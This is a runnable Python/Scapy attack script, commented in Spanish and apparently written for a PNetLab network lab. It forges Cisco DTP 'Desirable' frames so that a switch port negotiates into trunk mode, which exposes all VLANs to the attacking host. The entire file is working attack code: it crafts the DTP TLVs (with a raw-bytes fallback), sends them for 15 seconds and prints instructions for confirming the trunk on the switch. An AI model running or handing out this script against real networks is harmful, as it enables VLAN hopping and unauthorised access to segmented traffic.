#!/usr/bin/env python3
"""
DTP Attack Script - PNetLab
Fuerza trunk via DTP Desirable
"""

from scapy.all import *
from scapy.contrib.dtp import *
import struct
import os
import sys
import time

# ==========================================
# CONFIGURACION
# ==========================================
IFACE        = "eth1"
DOMAIN       = "mariana.local"
DTP_DURATION = 15

# ==========================================
# CONSTRUCCION DEL PAQUETE DTP
# ==========================================
def build_dtp_packet(iface, domain):
    src_mac = get_if_hwaddr(iface)
    eth  = Ether(dst="01:00:0c:cc:cc:cc", src=src_mac)
    llc  = LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03)
    snap = SNAP(OUI=0x00000c, code=0x2004)

    try:
        dtp = DTP(version=0x01, tlvlist=[
            DTPDomain(length=len(domain) + 4, domain=domain.encode()),
            DTPStatus(length=5, status=b"\x03"),
            DTPType(length=5, dtptype=b"\xa5"),
            DTPNeighbor(length=10, neighbor=mac2str(src_mac))
        ])
        return eth / llc / snap / dtp
    except:
        dtp_payload  = b'\x01'
        domain_bytes = domain.encode()
        dtp_payload += struct.pack('>HH', 0x0001, len(domain_bytes) + 4) + domain_bytes
        dtp_payload += struct.pack('>HHB', 0x0002, 5, 0x03)
        dtp_payload += struct.pack('>HHB', 0x0003, 5, 0xa5)
        neighbor_mac = bytes.fromhex(src_mac.replace(':', ''))
        dtp_payload += struct.pack('>HH', 0x0004, 10) + neighbor_mac
        return eth / llc / snap / Raw(load=dtp_payload)

# ==========================================
# ATAQUE
# ==========================================
def execute_attack():
    print(f"  + Interfaz : {IFACE}")
    print(f"  + Dominio  : {DOMAIN}")
    print(f"  + Duracion : {DTP_DURATION}s\n")

    print(f"  >> Enviando tramas DTP Desirable...")
    dtp_pkt    = build_dtp_packet(IFACE, DOMAIN)
    start_time = time.time()

    while time.time() - start_time < DTP_DURATION:
        sendp(dtp_pkt, iface=IFACE, verbose=False)
        elapsed = int(time.time() - start_time)
        print(f"  .. [{elapsed:02d}s] frame enviado", end='\r')
        time.sleep(1)

    print(f"\n  OK Negociacion DTP completada")
    print(f"  OK Puerto deberia estar en modo TRUNK")
    print(f"\n  >> Verifica en el switch:")
    print(f"     show interfaces trunk")
    print(f"     show interfaces [puerto] switchport\n")

if __name__ == "__main__":
    if os.geteuid() != 0:
        print("  !! Ejecuta como ROOT: sudo python3 Dtp.py")
        sys.exit(1)
    try:
        execute_attack()
    except KeyboardInterrupt:
        print("\n  !! Cancelado por el usuario.")
        sys.exit(0)
    except Exception as e:
        print(f"\n  !! Error: {e}")
